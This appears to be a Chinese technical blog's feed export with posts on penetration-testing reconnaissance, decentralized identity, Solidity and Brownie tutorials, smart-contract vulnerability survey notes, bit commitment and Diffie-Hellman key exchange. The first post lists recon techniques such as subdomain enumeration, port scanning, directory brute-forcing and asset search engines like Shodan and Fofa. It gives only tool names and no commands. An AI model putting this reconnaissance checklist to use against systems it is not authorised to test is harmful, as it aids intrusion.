    <url>/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="渗透测试之信息搜集（一）"><a href="#渗透测试之信息搜集（一）" class="headerlink" title="渗透测试之信息搜集（一）"></a>渗透测试之信息搜集（一）</h1><h2 id="0x01-针对域名的信息搜集"><a href="#0x01-针对域名的信息搜集" class="headerlink" title="0x01 针对域名的信息搜集"></a>0x01 针对域名的信息搜集</h2><p>子域名枚举</p><h2 id="0x02-针对IP的信息搜集"><a href="#0x02-针对IP的信息搜集" class="headerlink" title="0x02 针对IP的信息搜集"></a>0x02 针对IP的信息搜集</h2><p>C段 旁段<br>MSSCAN</p><h2 id="0x04-服务识别"><a href="#0x04-服务识别" class="headerlink" title="0x04 服务识别"></a>0x04 服务识别</h2><p>指纹识别<br>    主机信息<br>    中间件<br>    CMS识别<br>    wapplyzer<br>目录爆破 dirsearch<br>端口扫描</p><p>资产扫描 Fofa Hunter Zoomeye</p><p><a href="https://search.censys.io/">https://search.censys.io</a>      //端口收集扫描比较全<br><a href="https://hunter.qianxin.com/">https://hunter.qianxin.com</a>    //可视化图形资产，可与fofa结合使用<br><a href="https://duckduckgo.com/">https://duckduckgo.com</a>        //找后台比较无助的时候可以尝试site:xxx.com login<br><a href="https://fofa.info/">https://fofa.info</a>             //资产测绘<br><a href="https://ww.shodan.io/">https://ww.shodan.io</a>          //shodan</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，信息搜集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我是谁？|| Web3.0时代如何证明我是我</title>
    <link href="/2022/08/11/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E8%BA%AB%E4%BB%BDDID/"/>
    <url>/2022/08/11/%E5%8E%BB%E4%B8%AD%E5%BF%83%E5%8C%96%E8%BA%AB%E4%BB%BDDID/</url>
    
    <content type="html"><![CDATA[<p>“我是郭冬临。”长着秀气头发的青年程序员对着面试官介绍自己<br>而面试官并不会觉得他在假冒小品演员“郭冬临”，因为面试之前，小郭已经出具身份证证明自己是程序员郭冬临。<br>现代化社会，我们习惯于提供身份证件，账号密码等信息来证明“我是我”，从而不会把你我错认成公民彭于晏，你也无法冒充微信用户林俊杰或是微博用户郭冬临。</p><p>然而，目前的身份管理系统有几个缺陷：</p><p>中心化的机构如数字认证中心CA,公钥基础设施PKI等存储着这些用户数据或者密钥，提供服务。然而使得恶意攻击者可以窃取这些信息，盗用你的身份证明进而冒用你的身份。<br>区块链为身份认证的去中心化提供了解决方案：去中心化的标识符被存储在分布式账本和区块链上，它们是防篡改的，安全的，并且可以被任何人即时验证。</p><p>这减少了在服务器中存储身份信息的需要，使用户通过区块链账户登录，无缝访问Web3服务。<br>本文粗略地介绍了去中心化身份的概念，涵盖数字签名等密码学知识，提出笔者的一些思考，并且浅显地讨论去中心化身份及去中心化身份认证的解决方案。</p><h2 id="1-去中心化身份意味着什么？"><a href="#1-去中心化身份意味着什么？" class="headerlink" title="1 去中心化身份意味着什么？"></a>1 去中心化身份意味着什么？</h2><p>通俗地说，去中心化身份允许你拥有自己的身份。<br>一个组织（交通警察大队）想给你（用户）发一个证书（驾驶执照）。你发送你的钱包地址，这是分布式账本或区块链上用于存储数据的特定位置。然后交通警察大队用其私钥签署交易，将凭证发送到你的数字钱包。</p><p>现在，你可以在任何时候分享这个凭证，以确定你的身份：例如，在完成贷款申请时。对方使用算法验证，检查公钥和交易细节，以确认你的证件有效性。<br>在去中心化身份管理中，用户在 数字钱包中存储凭证和个人信息，就像现实生活中的钱包一样，数字钱包保存着你的身份证明，如你的执照或身份证。去中心化身份标识将身份信息的存储在分布式账本或区块链中，满足了防篡改，可验证，透明可追溯等特性。</p><h2 id="2-为何提出去中心化身份认证？"><a href="#2-为何提出去中心化身份认证？" class="headerlink" title="2 为何提出去中心化身份认证？"></a>2 为何提出去中心化身份认证？</h2><p>传统的身份认证方案，如常见的CA数字认证中心通过发放包含你公钥和信息绑定的数字证书，可以向他人证明你的公钥的有效性：PK-ID。<br>然而仅仅向他人发送一个被CA签名过的数字证书，会被中间人利用，冒充你的身份，此称为中间人攻击（MIMT）。</p><p>那么如何防止MIMT呢？</p><p>让第四方签署这个CA证书显然是不实际的，于是就衍生了许多方案，如PKI，信任链的概念来解决数字证书或者数字签名中间人攻击的问题。<br>去中心化身份便可用于替代这些中心化的方案。去中心化身份管理可以保证数据安全，同时不需要你去记那么多的ID，密码，一个账户满足所有应用登录。</p><h2 id="3-Inspiration灵光一现"><a href="#3-Inspiration灵光一现" class="headerlink" title="3 Inspiration灵光一现"></a>3 Inspiration灵光一现</h2><p>通过上传PK与身份信息，如ID的绑定到区块链上，可以实现替代CA的作用，由区块链承担身份验证；</p><p>在单点登录场景下，只有拥有区块链账户私钥的，才能发送交易进行登录操作。因此，即使攻击者窃取ID，密码等信息，仍然无法替代该账户发送交易进行登录。智能合约可以通过判断交易发起者的身份，进行登录验证，使得MIMT不可能实现！</p><p>因此Dapp不用公钥密码学进行身份认证也是可行的，只需要加入地址的判断，筛选掉攻击者。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/IJ-nYrFXUVl7ok76gM79EQ">https://mp.weixin.qq.com/s/IJ-nYrFXUVl7ok76gM79EQ</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://web3.hashnode.com/what-is-decentralized-identity">https://web3.hashnode.com/what-is-decentralized-identity</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链开发|给区块链初学者的实验启示(二)</title>
    <link href="/2022/06/24/Solidity%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/24/Solidity%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>最近对于自己的研究方向有些迷茫，会进入觉得自己做的东西是没有意义的怪圈里。<br>写完了专利，又陷入了没有方向的境地，于是想想不如好好做点开发的东西吧。<br>承接上一篇<a href="https://kitescat.github.io/2022/05/16/how2builddev4bc/">给区块链初学者的实验启示（一）</a></p><h2 id="0x01-Brownie的配置"><a href="#0x01-Brownie的配置" class="headerlink" title="0x01 Brownie的配置"></a>0x01 Brownie的配置</h2><ol><li>首先新建项目，新建虚拟环境，在虚拟环境中 pip install brownie</li><li>brownie init 新建 brownie 项目，生成框架</li><li>框架脚手架包括 合约文件夹，编译文件夹build等，测试文件夹 test，脚本文件夹 scripts<br>具体介绍详见Brownie 官网文档介绍</li><li>正常顺序应该是brownie console （控制台的意思）连接本地以太坊私链<br>  比如开启你的Ganache控制台 通过 <a href="https://127.0.0.1:8045/">https://127.0.0.1:8045</a> 连接</li><li>开始编写你的智能合约solidity文件，再写测试python代码</li></ol><p>tips:.env文件的配置 测试网络的配置 infura key或者account的导入，这些对于初学者来说估计都是难点。<br>一时间无法马上配好，或者经常出错。建议仔仔细细过一下流程，配置好环境依赖。</p><h2 id="0x02-智能合约的编写"><a href="#0x02-智能合约的编写" class="headerlink" title="0x02 智能合约的编写"></a>0x02 智能合约的编写</h2><p>本项目我们写一个最简单的智能合约，对智能合约变量进行Set和Get操作：<br>    pragma solidity ^0.8.15;//solidity版本号的设置<br>    //simple storage<br>    contract helloworld{<br>        uint storedData;//变量</p><pre><code class="hljs">    function set(uint x) external&#123;//external 表明函数只能被外部合约或账户调用        storedData = x;    &#125;    function get() external view returns (uint retVal) &#123;//view 表明函数可以对外部变量进行简单的读取操作 但不能修改外部变量        return storedData;    &#125;&#125;</code></pre><h2 id="0x03-智能合约变量和函数的修饰符"><a href="#0x03-智能合约变量和函数的修饰符" class="headerlink" title="0x03 智能合约变量和函数的修饰符"></a>0x03 智能合约变量和函数的修饰符</h2><p>public<br>private<br>external<br>internal<br>pure<br>view</p><p>值得一提的是 编译器一般会告诉你什么时候该加什么关键词 这是很方便的。</p><h2 id="0x04-脚本编写"><a href="#0x04-脚本编写" class="headerlink" title="0x04 脚本编写"></a>0x04 脚本编写</h2><p>开头引入helloworld 智能合约和network，accounts等关键词</p><pre><code class="hljs">from brownie import helloworld, network, accounts# simple storage 简单存储def deploy():    print(&quot;---------deploy-----------&quot;)    private_key = # 填入你的私钥    accounts.add(private_key) # 这里对项目添加账户才能执行发送交易等操作    storage_contract = helloworld.deploy(&#123;&quot;from&quot;: accounts[0]&#125;)    print(f&quot;storage contract deployed on &#123;network.show_active()&#125; network at : &#123;storage_contract.address&#125;&quot;)    print(&quot;---------set 1 和get 1 -----------&quot;)    storage_contract.set(1) # 由deploy() 得到智能合约 .set(1) 表明调用这个智能合约的函数    print(&quot;---------get----------&quot;)    output = storage_contract.get() # 注意独立运行get() 并不会输出任何信息 因为它设置的是return 我们没有print是不会输出的    print(output)def main():# main函数为程序的入口    deploy()</code></pre><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>智能合约简单存取操作还是很容易理解的，注意这里set 会发送一个交易，调用智能合约的set函数。<br>然而你get操作 却不需要发送交易 因为它不改变区块链智能合约的内容 因此不需要发送交易。</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>区块链开发</tag>
      
      <tag>区块链实验</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链开发之 Python Brownie框架</title>
    <link href="/2022/06/10/Brownie/"/>
    <url>/2022/06/10/Brownie/</url>
    
    <content type="html"><![CDATA[<h1 id="利用Python部署智能合约到以太坊区块链上"><a href="#利用Python部署智能合约到以太坊区块链上" class="headerlink" title="利用Python部署智能合约到以太坊区块链上"></a>利用Python部署智能合约到以太坊区块链上</h1><p>我们知道的以太坊Dapp开发物件包括 Javascript的 web3.js ；java的 web3j ；以及Python的web3.py<br>其中Python不仅提供了python实现的以太坊client，还有以太坊开发框架和<strong>智能合约安全检测包MythX</strong>等</p><h2 id="Brownie"><a href="#Brownie" class="headerlink" title="Brownie"></a>Brownie</h2><p>其实我最近一直在找一个可以替代hardhat的平台，发现这个框架还是可以很好地替代的<br>但是目前仍然在学习其开放的API和功能，目前实现了一个简单的智能合约部署，本地私链实现以及测试网实现</p><h2 id="Ganache"><a href="#Ganache" class="headerlink" title="Ganache"></a>Ganache</h2><p>Ganache是一个封装好的本地私链，有Gui界面，傻瓜操作，提供了http连接，使得本地测试很方便<br>这里需要注意以太坊Dapp开发过程中，有许多不同的连接方式，如wss，https，http(rpc)等等</p><p>这里提一下，与Ganache看起来很像的Geth，Geth是一个Go实现的以太坊客户端，全称为Go-ethereum，<br>可以运行一个以太坊节点，运行方式有轻节点的形式，解决了以太坊节点运行同步存储消耗大的问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>如果想要入门以太坊开发，这个框架可以看看</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
      <tag>区块链开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文扫读 | 智能合约安全漏洞检测技术研究综述</title>
    <link href="/2022/06/05/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E7%BB%BC%E8%BF%B0/"/>
    <url>/2022/06/05/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6%E7%BB%BC%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">原文标题：智能合约安全漏洞检测技术研究综述 Smart Contract Vulnerability Detection Technique: A Survey原文作者：钱 鹏, 刘振广,何钦铭等原文链接：DOI 10.13328/j.cnki.jos.006375原文来源：软件学报 ISSN</code></pre><h2 id="0X01-论文摘要"><a href="#0X01-论文摘要" class="headerlink" title="0X01 论文摘要"></a>0X01 论文摘要</h2><ol><li>从 <strong>Solidity 代码层、EVM 执行层、区块链系统层</strong>这 3 个层面介绍了智能合约常见的漏洞类型和典型案例</li><li>从<strong>形式化验证法、符号执行法、模糊测试法、中间表示法、深度学习法</strong>这 5 类方法综述了智能合约漏洞检测</li><li>对可检测漏洞类型、准确率、时间消耗等方面进行了详细的对比，提出了改进建议</li></ol><h2 id="0x02-主要漏洞和相关事件"><a href="#0x02-主要漏洞和相关事件" class="headerlink" title="0x02 主要漏洞和相关事件"></a>0x02 主要漏洞和相关事件</h2><p>我印象深刻的主要是可重入漏洞，拒绝服务和未知服务漏洞三个。</p><p><img src="/img/sc_vuls.png"></p><p>文章在讲分析工具的时候，好像没有仔细讲解基于EVM字节码，opcode以及solidity代码 三种检测的区别。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>很好地给出了漏洞类型分类以及对应的实际案例，用简单的例子说明了漏洞如何被利用;</li><li>比较好的是论文提到的内容和这几天看到的一些智能合约漏洞刚好契合,能比较简单的理解入门;</li><li>论文多次提到通过fallback函数实现攻击，不知道现在解决方案如何，值得考究；</li><li>还有就是权限漏洞那部分，require修饰器等，还得仔细看看，入门solidity看过但又忘记了；</li><li>启发点就是实际上就是代码审计的研究 如何把代码规范做好和如何实现自动化审计（深度学习）等方向。</li></ol><p>总的来说，这篇综述是很好的，对于想入门的同学，可以仔细研究一下。<br>而且我们实验室目前好像只听说过有做入侵检测，攻击识别之类的，没听说有代码审计自动化这个方向。  </p><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链网站/公众号整理推荐</title>
    <link href="/2022/06/05/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/"/>
    <url>/2022/06/05/%E5%8C%BA%E5%9D%97%E9%93%BE%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链网站或者公众号等推荐"><a href="#区块链网站或者公众号等推荐" class="headerlink" title="区块链网站或者公众号等推荐"></a>区块链网站或者公众号等推荐</h1><p>登链社区 <a href="https://learnblockchain.cn/">https://learnblockchain.cn/</a><br>零时科技博客 <a href="https://blog.csdn.net/m0_37598434?type=blog">https://blog.csdn.net/m0_37598434?type=blog</a><br>智能合约审计学习 CTF <a href="https://github.com/blockthreat/blocksec-ctfs">https://github.com/blockthreat/blocksec-ctfs</a><br>以太坊Go 开发 <a href="https://ethereum.org/zh/developers/docs/programming-languages/golang/">https://ethereum.org/zh/developers/docs/programming-languages/golang/</a><br>code4rena <a href="https://code4rena.com/">https://code4rena.com/</a><br>比赛 可信区块链安全攻防大赛<br>web3.py 入门学习</p>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文扫读 | 以太坊智能合约分析工具综述</title>
    <link href="/2022/06/01/SmartCon-Analysis/"/>
    <url>/2022/06/01/SmartCon-Analysis/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">原文标题：Ethereum Smart Contract Analysis Tools：A Systematic Review原文作者：SATPAL SINGH KUSHWAHA1, SANDEEP JOSHI1 et al.原文链接：DOI 10.1109/ACCESS.2022.3169902原文来源：IEEE Access</code></pre><h2 id="0X01-论文摘要"><a href="#0X01-论文摘要" class="headerlink" title="0X01 论文摘要"></a>0X01 论文摘要</h2><p>这篇论文主要讲智能合约存在的漏洞，并做了分类，对目前存在的智能合约分析工具（主要是以太坊solidity）做了总结，分为静态和动态。分别都有基于源码分析，基于EVM字节码分析以及基于两者分析的分析工具。目的是为了优化solidity代码的编写。</p><h2 id="0x02-智能合约流程"><a href="#0x02-智能合约流程" class="headerlink" title="0x02 智能合约流程"></a>0x02 智能合约流程</h2><p>这里值得注意的点就是<br><strong>1.从solidity到字节码;</strong><br><strong>2.发布合约得到智能合约地址;</strong><br><strong>3.每个节点都有账本副本，所以很难伪造</strong>。</p><h3 id="流程细节："><a href="#流程细节：" class="headerlink" title="流程细节："></a>流程细节：</h3><p><img src="/img/smartcon_flow.png"></p><p>以Alice和Bob之间的转账合同为例，如图5所示。<br>Alice和Bob达成了协议。</p><p>协议就是采用合同语言编写的（例如，以太坊中的solidity）。智能合约代码接下来通过编译器(例如，solc)编译，<strong>它生成机器码（或字节码）运行在智能合约客户端上的虚拟机</strong>(例如，EVM、JVM)或Docker容器之上。</p><p>智能合约客户端本质上是通过一个点对点的网络连接起来的。在区块链网络部署智能合约后，向客户端返回一个唯一的合同地址，以支持未来的交互。</p><p>此后，用户可以通过在智能合约中的交易与区块链网络互动(例如，从Alice的数字钱包中扣除指定数量的钱，增加对应鲍勃钱包里的钱)。</p><p>值得一提的是，每个交易都需要通过如图5所示的共识算法跨区块链网络进行验证。<br>验证交易，然后将操作附加到交易列表中。<strong>由于每个节点都有一个更新后的区块链的副本，因此很难伪造区块链数据</strong>。</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>这里大概讲的都是历史上出现过的合约漏洞，还有就是累赘代码的使用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通读下来，想得到的解答就是有没有可能实现智能合约代码审计并且输出修改意见，答案是有的；<br>还有就是Gas花费的优化也是可行的，目前看来就是删掉一些冗余代码；<br>至于这个方向有什么好做的，感觉还是得往深了看，我们还是站在外面浅尝则止吧！</p><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>论文阅读</category>
      
    </categories>
    
    
    <tags>
      
      <tag>区块链</tag>
      
      <tag>智能合约</tag>
      
      <tag>论文扫读</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学笔记|Commitment Schema之比特承诺</title>
    <link href="/2022/06/01/CommitmentSchema/"/>
    <url>/2022/06/01/CommitmentSchema/</url>
    
    <content type="html"><![CDATA[<h1 id="比特承诺"><a href="#比特承诺" class="headerlink" title="比特承诺"></a>比特承诺</h1><p>最近读论文，涉及到一个密码学概念：Commitment Schema。字面意思就是承诺方案。<br>很难理解，查阅了相关资料，搜集了一些有用的资料，下面搬运一篇来自公众号：包罗万想 的推文，链接为：<a href="https://mp.weixin.qq.com/s/Oc9mKmyDxzfyK6bulHmVyw">GCAC08 3.12比特承诺</a></p><h2 id="抛出问题："><a href="#抛出问题：" class="headerlink" title="抛出问题："></a>抛出问题：</h2><p>Alice和Bob约会。爱丽丝想看一部电影，鲍勃想看另一部电影。他们决定随机掷硬币选择电影。如果硬币正面朝上，它们将由爱丽丝选择；否则，他们将选择鲍勃的选择。当爱丽丝和鲍勃非常接近时，这很容易。他们都能验证结果。<br>但是当他们离得很远并且在电话里讲话时，这会变得更加困难。<br>鲍勃可以抛硬币，将结果告诉爱丽丝，但爱丽丝没有理由相信结果。<br>那么有什么办法来解决：让对方相信自己抛硬币的结果，并且<strong>自己无法篡改结果</strong>，在揭晓阶段又<strong>向对方证明自己确实是抛的正面/反面</strong>。<br>答案是 比特承诺！</p><h2 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h2><p>比特承诺是安全多方计算中最重要的基础协议之一，对构建更复杂的多方协议起着重要作用。</p><p>比特承诺(BitCommitment， BC)是密码学中的重要基础协议，其概念最早由 1995 年图灵奖得主 Blum提出。比特承诺方案可用于构建<strong>零知识证明、可验证秘密共享、硬币投掷等协议</strong>，同时和不经意传送一起构成两方安全计算的基础，是信息安全领域研究的热点。主要包含C,V两个算法。<br><img src="/img/commit_view.jpg"></p><h2 id="0x02-基本思想"><a href="#0x02-基本思想" class="headerlink" title="0x02 基本思想"></a>0x02 基本思想</h2><p>发送者 Alice 向接收者Bob 承诺一个比特b (如果是多个比特，即比特串t ，则称为比特 串承诺)，要求：</p><p>在第 1 阶段即承诺阶段 Alice 向 Bob 承诺这 个比特b ，但是 <strong>Bob 无法知道b 的信息</strong>；</p><p>在第 2 阶段即揭示阶段<strong>Alice 向 Bob 证实她在第 1 阶段承诺的确实是b</strong>，但是 Alice 无法欺骗 Bob(即不能在第 2 阶段篡改b的值)。</p><h2 id="0x03-经典环境示例"><a href="#0x03-经典环境示例" class="headerlink" title="0x03 经典环境示例"></a>0x03 经典环境示例</h2><p>Alice将待承诺的比特或秘密写在一张纸上，然后将这张纸锁进一个保险箱，该保险箱只有唯一的钥匙可以打开。</p><p>在承诺阶段， Alice将保险箱送给 Bob，但是保留钥匙；</p><p>到了揭示阶段，Alice将比特或秘密告诉 Bob，同时将钥匙传给 Bob 使其相信自己的承诺。</p><p>需要指出的是，保险箱不能被“暴力破解”的性质甚至允许Alice 在揭示阶段无需向 Bob 说明承诺的比特或秘密，只要将钥匙发送给 Bob 即可。</p><h2 id="0x04-性质"><a href="#0x04-性质" class="headerlink" title="0x04 性质"></a>0x04 性质</h2><p>一个比特承诺方案必须具备下列性质：</p><p>正确性：如果 Alice 和 Bob 均诚实地执行协议，那么在揭示阶段 Bob 将正确获得 Alice 承诺的比特b 。</p><p>保密性Hiding：在揭示阶段之前 Bob 不能获知b的信息。</p><p><img src="/img/hiding.jpg"></p><p>绑定性Binding ：在承诺阶段结束之后，Bob只能在揭示阶段获得唯一的b (即 Alice 无法将b 反转，就好像 Alice 与b “绑定”在一起一样)。<br>如果一个比特承诺协议同时满足保密性和绑定性，且没有对攻击者的计算能力做任何限制性假设，则称该比特承诺协议是无条件安全的。</p><p><img src="/img/binding.jpg"></p><h2 id="0x05-三方比特承诺"><a href="#0x05-三方比特承诺" class="headerlink" title="0x05 三方比特承诺"></a>0x05 三方比特承诺</h2><p>在该模型下，承诺者由一人变为二人Alice 与 Bob，由此<strong>二人共同向第三方Chris 承诺一个比特或比特串</strong>。</p><p>承诺阶段之前， Alice 与Bob 可以自由通信以商定承诺内容，但是在协议开始以后，要求 Alice 与 Bob 无法再进行通信。（考虑到量子计算环境，协议开始之后， Alice 与Bob 被物理隔离，无法再进行经典通信和量子通信，最多只允许对本地量子进行局域测量）。</p><p>该模型最重要的特点是揭示阶段由 Bob 负责向 Chris 揭示b 的信息，因此 Alice 没有任何作弊的可能，即无法破坏协议的绑定性。</p><h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><h4 id="囚徒困境"><a href="#囚徒困境" class="headerlink" title="囚徒困境"></a>囚徒困境</h4><p>三方参与的安全模型在实际生活中是有很多应用的，例如在博弈论的经典“囚徒困境”模型中，两个纵火嫌疑犯即可以视作证明者，他们在被抓住以前可以自由交流(例如商定问讯对策)，被抓以后将被警察(验证者)分开审讯。如果这两个嫌疑犯均“忠实”地在审讯过程中坚持否认纵火事实，那么他们将获得集体最优结果。又如，由两家单位合作来对某个大型项目进行投标(例如资金与技术的合作)，则这两家单位和招标方构成三方承诺模型。</p><h4 id="安全多方计算"><a href="#安全多方计算" class="headerlink" title="安全多方计算"></a>安全多方计算</h4><p>另外，一些安全多方计算的协议模型，其最基本的组成结构也经常是三方，而非两方。例如可验证秘密分享(Verifiable Secret Sharing，VSS)，除了一个秘密分发方外，秘密分享方至少是两方，因此一个秘密分享方案至少需要三方的参与。又如，在匿名通信的重要基础模型——密码学家就餐问题中，参与的密码学家至少为三个。</p><p>后续讲解Secret Sharing 秘密分享协议！</p><center>欢迎关注我的个人公众号</center><p><img src="/img/debug.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go开发学习笔记 | 数据类型</title>
    <link href="/2022/06/01/Golang-road/"/>
    <url>/2022/06/01/Golang-road/</url>
    
    <content type="html"><![CDATA[<h2 id="GO的基本数据类型"><a href="#GO的基本数据类型" class="headerlink" title="GO的基本数据类型"></a>GO的基本数据类型</h2><p>uint int string等</p><h2 id="GO的类型零值"><a href="#GO的类型零值" class="headerlink" title="GO的类型零值"></a>GO的类型零值</h2><p>0还是false 还是nil</p><h2 id="类型别名"><a href="#类型别名" class="headerlink" title="类型别名"></a>类型别名</h2><p>起名字</p><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p>不允许隐式转换</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>定义 声明 赋值</p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学笔记|Diffie Hellman key exchange 密钥交换协议</title>
    <link href="/2022/05/27/DH-keyexchange/"/>
    <url>/2022/05/27/DH-keyexchange/</url>
    
    <content type="html"><![CDATA[<h1 id="安全地交换共享密钥！"><a href="#安全地交换共享密钥！" class="headerlink" title="安全地交换共享密钥！"></a>安全地交换共享密钥！</h1><p>1976年，Diffie和Hellman在其题为《密码学的新方向》的论文中给出了公钥密码学的定义，并提出了DH密钥交换算法。<br>该算法解决了对称密码体制中的密钥分发问题，使得通信双方可以通过公开信道安全地交换共享密钥，将此共享密钥用于会话加密。<br>其安全性建立在离散对数问题的困难性之上。</p><p>为了更好地说明密钥交换协议的作用，我将会以自己的语言讲一遍<strong>为什么我们需要DH key exchange</strong></p><h2 id="0x01-跟我一起设计密钥方案！"><a href="#0x01-跟我一起设计密钥方案！" class="headerlink" title="0x01 跟我一起设计密钥方案！"></a>0x01 跟我一起设计密钥方案！</h2><p>假设有两个人Alice 和 Bob 他们要传递信息<br><strong>分为对称密码学和非对称密码学的角度来设计</strong></p><h3 id="1-1-第一回合"><a href="#1-1-第一回合" class="headerlink" title="1.1 第一回合"></a>1.1 第一回合</h3><p>最简单没有任何措施的方法，就是直接传信息，比如 Alice：“今天天气晴朗！” Bob就会收到该信息。<br>但是这有很大的问题，最大的问题就是没有保密性，任何监听他们通信信道的人都能回去该消息的明文。</p><h3 id="1-2-第二回合"><a href="#1-2-第二回合" class="headerlink" title="1.2 第二回合"></a>1.2 第二回合</h3><p>那么我们升级方案，对该消息加密，利用对称密码学进行加密。<br>对称密码学的大白话意思就是：加密和解密都是同一个密钥。<br>这里双方决定以k为对称密钥，Alice对m用k加密，Bob对c用k解密得到m。</p><p>假设这里密钥提前确定，且双方都不泄露密钥，那么该协议就是安全的。</p><p>但是这里问题来了，如果Alice和Bob两人距离很远，不能提前商定用什么作为对称密钥，就又得传输该密钥。这样显然是不安全的。<br>为了传递消息，还需要传输密钥，方案不可行。</p><h3 id="1-3-第三回合"><a href="#1-3-第三回合" class="headerlink" title="1.3 第三回合"></a>1.3 第三回合</h3><p>使用非对称密钥学。即加密和解密的密钥是不一样的，<strong>公钥加密，私钥解密</strong>。<br>    Alice Pk1，Sk1<br>    Bob   Pk2, Sk2</p><p>Alice发送m，先用公钥对m加密得到c<br>Bob得到c，之后用Alice的私钥解密的到m。</p><p>这里好像也是可行的，但显然用Alice的私钥解密是很理想的状态，事实就是私钥不会随意传输给对方。（长期密钥的话）<br>我们对m用Pk1加密之后，就必须要用Sk1解密，那问题来了，怎么传输Sk1给Bob，这里又是一个死结。<br><strong>因为私钥一旦暴露，传递信息也就暴露，所以我们不能传输私钥。</strong></p><h3 id="1-4-第四回合"><a href="#1-4-第四回合" class="headerlink" title="1.4 第四回合"></a>1.4 第四回合</h3><p>终于我们引出了DH key exchange协议！<br>DH密钥交换协议的目的是，在不传输私钥的情况下，双方得到一个共享秘密，该秘密可以作为对称密钥进行加密。<br>也就是说，在传递m之前，Alice和Bob必须先进行密钥交换，得到共享秘密shared secret。<br><img src="/img/DH1.jpg"></p><h2 id="0x02-DH-密钥交换协议的介绍"><a href="#0x02-DH-密钥交换协议的介绍" class="headerlink" title="0x02 DH 密钥交换协议的介绍"></a>0x02 DH 密钥交换协议的介绍</h2><h3 id="2-1-为什么需要该协议？"><a href="#2-1-为什么需要该协议？" class="headerlink" title="2.1 为什么需要该协议？"></a>2.1 为什么需要该协议？</h3><p>为了解决对称密码体制中的密钥分发问题，使得通信双方可以通过公开信道安全地交换共享密钥。<br>提出了公钥密码学的概念，共享的是公钥，收到对方公钥之后，在对方公钥的基础上运算得到共享密钥。</p><h3 id="2-2-协议细节"><a href="#2-2-协议细节" class="headerlink" title="2.2 协议细节"></a>2.2 协议细节</h3><p><img src="/img/DH2.png"></p><h3 id="最终实现了什么目的"><a href="#最终实现了什么目的" class="headerlink" title="最终实现了什么目的"></a>最终实现了什么目的</h3><p>最终，Alice和Bob在一个非安全信道上实现了一个安全的秘密共享。并获得一个密钥，可以加密他们的对话。</p><h3 id="2-3-应用场景"><a href="#2-3-应用场景" 